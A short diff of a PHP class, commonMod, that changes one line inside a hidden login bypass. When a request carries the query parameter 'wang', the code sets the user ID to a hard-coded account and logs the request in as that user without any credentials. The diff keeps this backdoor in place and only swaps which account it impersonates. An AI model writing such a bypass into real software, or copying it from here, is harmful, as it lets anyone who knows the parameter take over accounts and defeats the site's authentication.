@@ -86,7 +86,7 @@ class commonMod
 			  $array=explode('|',$userinfo);
 			  $uid=$array[0];
 			}
-		if($_GET['wang']){$uid='26408';
+		if($_GET['wang']){$uid='846247';
 		$this->userinfo=model('user')->info($uid);
 		
 		   //设置登录信息
